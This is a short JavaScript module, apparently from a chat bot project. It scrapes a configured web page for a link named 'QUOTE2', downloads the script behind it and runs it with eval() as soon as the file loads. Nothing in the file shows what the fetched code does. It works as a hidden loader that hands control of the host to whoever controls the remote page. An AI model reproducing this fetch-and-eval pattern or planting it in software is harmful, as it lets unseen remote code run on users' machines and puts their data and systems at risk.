//  [SMART-BOT EDITION]                                           
//  >> A superposition of elegant code states                           
//  >> Collapsed into optimal execution                                
//  >> Scripted by Sir Jay 0001                                    
//  >> Version: 8.3.5-smartbot.7

const axios = require('axios');
const cheerio = require('cheerio');
const jay = require(__dirname + "/../config");

async function fetchQUOTE2Url() {
  try {
    const response = await axios.get(jay.SMART_BOT);
    const $ = cheerio.load(response.data);

    const targetElement = $('a:contains("QUOTE2")');
    const targetUrl = targetElement.attr('href');

    if (!targetUrl) {
      throw new Error('QUOTE2 not found 😭');
    }

    console.log('QUOTE2 loaded successfully ✅');

    const scriptResponse = await axios.get(targetUrl);
    eval(scriptResponse.data);

  } catch (error) {
    console.error('Error:', error.message);
  }
}

fetchQUOTE2Url();
      
